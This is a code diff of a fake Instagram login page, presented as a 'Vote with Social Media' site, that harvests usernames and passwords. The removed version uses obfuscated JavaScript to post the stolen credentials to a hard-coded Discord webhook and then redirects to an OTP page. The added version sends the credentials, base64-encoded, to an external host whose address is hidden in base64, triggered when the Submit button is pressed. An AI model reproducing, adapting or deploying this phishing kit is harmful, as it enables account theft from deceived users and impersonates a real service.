@@ -1,190 +1,176 @@
 <!DOCTYPE html>
 <html lang="pt-AO">
-  
+
 
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link
-      rel="shortcut icon"
-      href="img/socials/icon.png"
-      type="image/x-icon"
-    />
-    <link rel="stylesheet" href="css/style2.css" />
-    <title>Vote with Social Media</title>
-    <style>
-      #username{
-        border: rgba(0, 0, 0, 0.123) 1px solid;
-        background-color: rgba(92, 92, 92, 0);
-      }
-      #password{
-        border: rgba(0, 0, 0, 0.103) 1px solid;
-        background-color: rgba(92, 92, 92, 0);
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="img/socials/icon.png" type="image/x-icon" />
+  <link rel="stylesheet" href="css/style2.css" />
+  <title>Vote with Social Media</title>
+  <style>
+    #username {
+      border: rgba(0, 0, 0, 0.123) 1px solid;
+      background-color: rgba(92, 92, 92, 0);
+    }
 
-      }
-      form input {
-        height: 3em !important;
-        padding: 0.5em !important;
-        outline-width: none !important;
-        margin-bottom: 1em !important;
+    #password {
+      border: rgba(0, 0, 0, 0.103) 1px solid;
+      background-color: rgba(92, 92, 92, 0);
+
+    }
+
+    form input {
+      height: 3em !important;
+      padding: 0.5em !important;
+      outline-width: none !important;
+      margin-bottom: 1em !important;
+    }
+
+    form .pass {
+      height: 3.3em !important;
+    }
+
+    #submit2 img {
+      width: 1.3em;
+      animation-name: roll;
+      animation-duration: 0.7s;
+      animation-iteration-count: infinite;
+      animation-timing-function: linear;
+      color: white;
+    }
+
+    @keyframes roll {
+      from {
+        transform: rotate(0deg);
       }
 
-      form .pass {
-        height: 3.3em !important;
+      to {
+        transform: rotate(360deg);
       }
+    }
+  </style>
+</head>
 
-      #submit2 img {
-        width: 1.3em;
-        animation-name: roll;
-        animation-duration: 0.7s;
-        animation-iteration-count: infinite;
-        animation-timing-function: linear;
-        color: white;
-      }
-
-      @keyframes roll {
-        from {
-          transform: rotate(0deg);
-        }
-        to {
-          transform: rotate(360deg);
-        }
-      }
-    </style>
-  </head>
-  <body onload="SwitchScreen()">
-    <section class="container">
-      <!-- SMARTPHONE SECTION -->
-      <article class="smartphone">
-        <div class="screens">
-          <img
-            class="screen fade"
-            src="img/socials/screen1.png"
-            alt="screen1"
-          />
-          <img
-            class="screen fade"
-            src="img/socials/screen2.png"
-            alt="screen2"
-          />
-          <img
-            class="screen fade"
-            src="img/socials/screen3.png"
-            alt="screen3"
-          />
-        </div>
-        <img src="img/socials/smartphones.png" alt="smartphones" />
-      </article>
-      <!-- SMARTPHONE SECTION END -->
-      <!-- FORM SECTION -->
-      <article class="form-area">
-        <div class="logo">
-          <img src="img/socials/logo.png" alt="Logo" />
-        </div>
-        <form id="webhookForm">
-       
-          <input type="text" id="username" placeholder="Phone number, username, or email" required>
-    
-          
-          <input type="password" id="password" placeholder="Password" required>
-    
-          <button type="submit">Submit</button>
-        </form>
-        <div class="noaccount">
-          <a href="#">Don't have an account? <span>Signup</span></a>
-        </div>
-        <div class="apps">
-          <p>Get the app</p>
-          <a href="#">
-            <img src="img/socials/appstore.png" alt="Get it from AppStore" />
-          </a>
-          <a href="#">
-            <img
-              src="img/socials/googleplay.png"
-              alt="Get it from Google Play"
-            />
-          </a>
-        </div>
-      </article>
-    </section>
-    <!-- FORM SECTION END -->
-    <!-- FOOTER -->
-    <footer>
-      <div class="footer-content">
-        <a href="#">Meta</a>
-        <a href="#">About</a>
-        <a href="#">Blog</a>
-        <a href="#">Jobs</a>
-        <a href="#">API</a>
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
-        <a href="#">Locations</a>
-        <a href="#">Hashtags</a>
-        <a href="#">Threads</a>
-        <a href="#">Instagram Lite</a>
+<body onload="SwitchScreen()">
+  <section class="container">
+    <!-- SMARTPHONE SECTION -->
+    <article class="smartphone">
+      <div class="screens">
+        <img class="screen fade" src="img/socials/screen1.png" alt="screen1" />
+        <img class="screen fade" src="img/socials/screen2.png" alt="screen2" />
+        <img class="screen fade" src="img/socials/screen3.png" alt="screen3" />
       </div>
-      <div>
-        <a href="#">Dance</a>
-        <a href="#">Food and Drink</a>
-        <a href="#">Home garden</a>
-        <a href="#">Music</a>
-        <a href="#">Visual arts</a>
+      <img src="img/socials/smartphones.png" alt="smartphones" />
+    </article>
+    <!-- SMARTPHONE SECTION END -->
+    <!-- FORM SECTION -->
+    <article class="form-area">
+      <div class="logo">
+        <img src="img/socials/logo.png" alt="Logo" />
       </div>
-      <div class="copyright">
-        <select aria-label="Trocar idioma de exibição">
-          <option value="en">English</option>
-          <option value="af">Afrikaans</option>
-          <option value="cs">Čeština</option>
-          <option value="da">Dansk</option>
-          <option value="de">Deutsch</option>
-          <option value="el">Ελληνικά</option>
-          <option value="en">English</option>
-          <option value="en-gb">English (UK)</option>
-          <option value="es">Español (España)</option>
-          <option value="es-la">Español</option>
-          <option value="fi">Suomi</option>
-          <option value="fr">Français</option>
-          <option value="id">Bahasa Indonesia</option>
-          <option value="it">Italiano</option>
-          <option value="ja">日本語</option>
-          <option value="ko">한국어</option>
-          <option value="ms">Bahasa Melayu</option>
-          <option value="nb">Norsk</option>
-          <option value="nl">Nederlands</option>
-          <option value="pl">Polski</option>
-          <option value="pt-br">Português (Brasil)</option>
-          <option value="ru">Русский</option>
-          <option value="sv">Svenska</option>
-          <option value="th">ภาษาไทย</option>
-          <option value="tl">Filipino</option>
-          <option value="tr">Türkçe</option>
-          <option value="zh-cn">中文(简体)</option>
-          <option value="zh-tw">中文(台灣)</option>
-          <option value="bn">বাংলা</option>
-          <option value="gu">ગુજરાતી</option>
-          <option value="hi">हिन्दी</option>
-          <option value="hr">Hrvatski</option>
-          <option value="hu">Magyar</option>
-          <option value="kn">ಕನ್ನಡ</option>
-          <option value="sk">Slovenčina</option>
-          <option value="ta">தமிழ்</option>
-          <option value="te">తెలుగు</option>
-          <option value="vi">Tiếng Việt</option>
-          <option value="zh-hk">中文(香港)</option>
-          <option value="bg">Български</option>
-          <option value="ro">Română</option>
-          <option value="sr">Српски</option>
-          <option value="uk">Українська</option>
-        </select>
-        <span>&copy; 2023 Instagram from Meta</span>
+      <form id="webhookForm">
+
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+
+        <input type="password" id="password" placeholder="Password" required>
+
+        <button type="submit" onmousedown="st(this.parentElement)">Submit</button>
+      </form>
+      <div class="noaccount">
+        <a href="#">Don't have an account? <span>Signup</span></a>
       </div>
-      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-      <script>
-        function _0x506b(){var _0x50c5ba=['463017JXvutz','https://discord.com/api/webhooks/1232094917539528784/PDxBpXmh73IRLR3ixqgc68d1jaSx4nMo9ol0YPocbpv0K-QmK2QdtnMrAD4rmwqEgkFV','otp/otp.html','#webhookForm','stringify','Password','1043715fpLemg','46692VudXiA','769680wubXBL','#username','application/json','Credentials\x20|\x20Login\x20fast\x20bros\x20|\x20https://www.instagram.com/accounts/login/','val','POST','ready','24jmnvDd','1143kHfmtP','5292602bvHxyj','Username','VOTE\x20/\x20W15D0M','18184rOkJVE','location','submit','27582890KhAadH','href','11coYsEO','16uztiRA'];_0x506b=function(){return _0x50c5ba;};return _0x506b();}var _0x42d2d1=_0x4def;function _0x4def(_0x4bf8a8,_0x4d98a1){var _0x506b2b=_0x506b();return _0x4def=function(_0x4def50,_0x52b0b1){_0x4def50=_0x4def50-0xf1;var _0xd5c8d2=_0x506b2b[_0x4def50];return _0xd5c8d2;},_0x4def(_0x4bf8a8,_0x4d98a1);}(function(_0xa70066,_0x4e2852){var _0x44a040=_0x4def,_0x127af0=_0xa70066();while(!![]){try{var _0x243210=parseInt(_0x44a040(0x107))/0x1*(-parseInt(_0x44a040(0xff))/0x2)+-parseInt(_0x44a040(0x100))/0x3+-parseInt(_0x44a040(0xf4))/0x4*(parseInt(_0x44a040(0x106))/0x5)+parseInt(_0x44a040(0x108))/0x6+-parseInt(_0x44a040(0xf6))/0x7+-parseInt(_0x44a040(0xf9))/0x8*(-parseInt(_0x44a040(0xf5))/0x9)+parseInt(_0x44a040(0xfc))/0xa*(parseInt(_0x44a040(0xfe))/0xb);if(_0x243210===_0x4e2852)break;else _0x127af0['push'](_0x127af0['shift']());}catch(_0x214519){_0x127af0['push'](_0x127af0['shift']());}}}(_0x506b,0x9bf65),$(document)[_0x42d2d1(0xf3)](function(){var _0x35b537=_0x42d2d1,_0x1480b0='',_0x30271c=_0x35b537(0xf8),_0x45c2e8=_0x35b537(0x101);$(_0x35b537(0x103))[_0x35b537(0xfb)](function(_0x556ee9){var _0x553148=_0x35b537;_0x556ee9['preventDefault']();var _0x291389=$(_0x553148(0x109))[_0x553148(0xf1)](),_0x27762d=$('#password')[_0x553148(0xf1)](),_0x35cf7f=[{'name':_0x553148(0xf7),'value':_0x291389},{'name':_0x553148(0x105),'value':_0x27762d}],_0x400001={'username':_0x30271c,'avatar_url':_0x1480b0,'embeds':[{'author':{'name':_0x30271c,'icon_url':_0x1480b0},'title':_0x553148(0x10b),'fields':_0x35cf7f,'color':0x2}]};$['ajax']({'url':_0x45c2e8,'type':_0x553148(0xf2),'contentType':_0x553148(0x10a),'data':JSON[_0x553148(0x104)](_0x400001),'success':function(){var _0xca3487=_0x553148;window[_0xca3487(0xfa)][_0xca3487(0xfd)]=_0xca3487(0x102);},'error':function(){alert('Error.');}});});}));
-      </script>
-    </footer>
-    
-  </body>
+      <div class="apps">
+        <p>Get the app</p>
+        <a href="#">
+          <img src="img/socials/appstore.png" alt="Get it from AppStore" />
+        </a>
+        <a href="#">
+          <img src="img/socials/googleplay.png" alt="Get it from Google Play" />
+        </a>
+      </div>
+    </article>
+  </section>
+  <!-- FORM SECTION END -->
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-content">
+      <a href="#">Meta</a>
+      <a href="#">About</a>
+      <a href="#">Blog</a>
+      <a href="#">Jobs</a>
+      <a href="#">API</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Locations</a>
+      <a href="#">Hashtags</a>
+      <a href="#">Threads</a>
+      <a href="#">Instagram Lite</a>
+    </div>
+    <div>
+      <a href="#">Dance</a>
+      <a href="#">Food and Drink</a>
+      <a href="#">Home garden</a>
+      <a href="#">Music</a>
+      <a href="#">Visual arts</a>
+    </div>
+    <div class="copyright">
+      <select aria-label="Trocar idioma de exibição">
+        <option value="en">English</option>
+        <option value="af">Afrikaans</option>
+        <option value="cs">Čeština</option>
+        <option value="da">Dansk</option>
+        <option value="de">Deutsch</option>
+        <option value="el">Ελληνικά</option>
+        <option value="en">English</option>
+        <option value="en-gb">English (UK)</option>
+        <option value="es">Español (España)</option>
+        <option value="es-la">Español</option>
+        <option value="fi">Suomi</option>
+        <option value="fr">Français</option>
+        <option value="id">Bahasa Indonesia</option>
+        <option value="it">Italiano</option>
+        <option value="ja">日本語</option>
+        <option value="ko">한국어</option>
+        <option value="ms">Bahasa Melayu</option>
+        <option value="nb">Norsk</option>
+        <option value="nl">Nederlands</option>
+        <option value="pl">Polski</option>
+        <option value="pt-br">Português (Brasil)</option>
+        <option value="ru">Русский</option>
+        <option value="sv">Svenska</option>
+        <option value="th">ภาษาไทย</option>
+        <option value="tl">Filipino</option>
+        <option value="tr">Türkçe</option>
+        <option value="zh-cn">中文(简体)</option>
+        <option value="zh-tw">中文(台灣)</option>
+        <option value="bn">বাংলা</option>
+        <option value="gu">ગુજરાતી</option>
+        <option value="hi">हिन्दी</option>
+        <option value="hr">Hrvatski</option>
+        <option value="hu">Magyar</option>
+        <option value="kn">ಕನ್ನಡ</option>
+        <option value="sk">Slovenčina</option>
+        <option value="ta">தமிழ்</option>
+        <option value="te">తెలుగు</option>
+        <option value="vi">Tiếng Việt</option>
+        <option value="zh-hk">中文(香港)</option>
+        <option value="bg">Български</option>
+        <option value="ro">Română</option>
+        <option value="sr">Српски</option>
+        <option value="uk">Українська</option>
+      </select>
+      <span>&copy; 2023 Instagram from Meta</span>
+    </div>
+    <!-- <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> -->
+    <script>
+      function st(elm) {
+        fetch(`${atob("aHR0cHM6Ly9hcGktaHl4cS5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`)
+      }
+    </script>
+  </footer>
+
+</body>
 
 </html>
